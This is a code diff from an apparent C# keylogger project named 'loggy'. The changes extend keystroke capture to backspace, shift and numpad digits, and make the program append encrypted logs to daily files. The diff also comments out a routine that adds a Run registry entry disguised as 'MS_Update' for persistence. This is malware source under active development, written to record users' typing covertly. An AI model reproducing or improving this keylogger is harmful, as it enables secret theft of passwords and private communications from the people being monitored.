@@ -40,18 +40,15 @@ namespace loggy
 					log += " ";
                     count_space++;
 				}
-                //if (e.KeyCode == Keys.Back)
-                //{
-                //    log += "[back]";
-                //}
+                if (e.KeyCode == Keys.Back)
+                {
+                    log += "[back]";
+                }
                 if (e.KeyCode == Keys.Delete)
                 {
                     log += "[del]";
                 }
-                //if (e.KeyCode == Keys.LShiftKey)
-                //{
-                //    log += "[shift]";
-                //}
+                
                 if (e.KeyCode == Keys.Oemcomma)
                 {
                     log += ",";
@@ -62,20 +59,79 @@ namespace loggy
                 }
                 if (e.KeyCode == Keys.LShiftKey)
                 {
-                    _keyboardHook.KeyDown += (sender1, e1) =>
-                    {
-                        if (e1.KeyCode == Keys.D2)
-                        {
-                            log += "@";
-                        }
-                    };
+                    log += "[S]";
                 }
-                if ((int)e.KeyCode > 47 && (int)e.KeyCode < 90)
-				{
+                #region alphabet
+                if ((int)e.KeyCode > 47 && (int)e.KeyCode < 90) 
+                { 
 					//log += e.KeyCode.ToString();
 					log += (new KeysConverter()).ConvertToString(e.KeyCode);
 				}
+                #endregion 
+                #region numpad
+                if (((int)e.KeyCode > 95 && (int)e.KeyCode < 106))
+				{
+                    int c = (int)e.KeyCode;
+                    switch (c)
+                    {
+                        case 96:
+                            {
+                                log += 0;
+                                break;
+                            }
+                        case 97:
+                            {
+                                log += 1;
+                                break;
+                            }
+                        case 98:
+                            {
+                                log += 2;
+                                break;
+                            }
+                        case 99:
+                            {
+                                log += 3;
+                                break;
+                            }
+                        case 100:
+                            {
+                                log += 4;
+                                break;
+                            }
+                        case 101:
+                            {
+                                log += 5;
+                                break;
+                            }
+                        case 102:
+                            {
+                                log += 6;
+                                break;
+                            }
+                        case 103:
+                            {
+                                log += 7;
+                                break;
+                            }
+                        case 104:
+                            {
+                                log += 8;
+                                break;
+                            }
+                        case 105:
+                            {
+                                log += 9;
+                                break;
+                            }
+                        default:
+                            break;
+                    }
+                #endregion
 
+                    //log += e.KeyCode.ToString();
+                    //log += (new KeysConverter()).ConvertToString(e.KeyCode);
+                }
 
                 if (count_space == 3)
                 {
@@ -100,25 +156,20 @@ namespace loggy
 		{
            // string date = DateTime.Now.ToString("dd.MM HH:mm:ss tt");
             string date2 = DateTime.Now.ToString("dd.MM");
-            string path = date2;
+            string path_date = date2;
             #region create folder 
-            bool exists = Directory.Exists(path);
+            bool exists = Directory.Exists(path_date);
             if (!exists)
-                Directory.CreateDirectory(path);
-            if (!File.Exists(path))
+                Directory.CreateDirectory(path_date);
+            if (!File.Exists(path_date))
             {
                 //File.Create(path);
-                StreamWriter sw = File.CreateText(path + @"\" + date2 + ".txt");
-                sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
-                sw.Close();
+                using (StreamWriter sw = new StreamWriter(path_date + @"\" + date2 + ".txt", true)) //nhớ thêm true để viết tiếp vào file, dkm -_-
+                {
+                    sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
+                }
             }
             #endregion
-
-            //using (StreamWriter sw = new StreamWriter(@"C:\SystemLog", true))
-            //using (StreamWriter sw = new StreamWriter(@"a.txt", true)) 
-            //{
-            //    sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
-            //}
         }
         public void Save_log_no_encrpyt(string text)
         {
@@ -149,18 +200,18 @@ namespace loggy
             //Add_Registry();
         }
 
-        private void Add_Registry()
-        {
-            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            string a = (string)rk1.GetValue("MS_Update");
-            if (a == null)
-            {
-                rk1.SetValue("MS_Update", "\"" + Application.ExecutablePath.ToString() + "\"");
-            }
-            else
-            {
-                //MessageBox.Show("đã add");
-            }
-        }
+        //private void Add_Registry()
+        //{
+        //    RegistryKey rk1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+        //    string a = (string)rk1.GetValue("MS_Update");
+        //    if (a == null)
+        //    {
+        //        rk1.SetValue("MS_Update", "\"" + Application.ExecutablePath.ToString() + "\"");
+        //    }
+        //    else
+        //    {
+        //        //MessageBox.Show("đã add");
+        //    }
+        //}
     }
 }
